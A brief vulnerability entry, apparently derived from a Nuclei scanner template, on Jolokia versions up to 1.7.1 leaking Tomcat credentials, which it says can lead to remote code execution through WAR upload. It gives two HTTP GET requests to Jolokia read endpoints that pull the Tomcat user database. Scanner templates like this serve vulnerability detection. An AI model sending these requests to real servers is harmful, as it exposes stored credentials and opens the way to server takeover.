# Vulnerability: Jolokia <= 1.7.1 Information Leakage
**Classification:** JOLOKIA
**Source:** Nuclei Template (`jolokia-tomcat-creds-leak.yaml`)

## Description
Tomcat's credential disclosure leading to Remote Code Execution via WAR upload.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/jolokia/read/Users:database=UserDatabase,type=UserDatabase
GET {{BaseURL}}/actuator/jolokia/read/Users:database=UserDatabase,type=UserDatabase
```

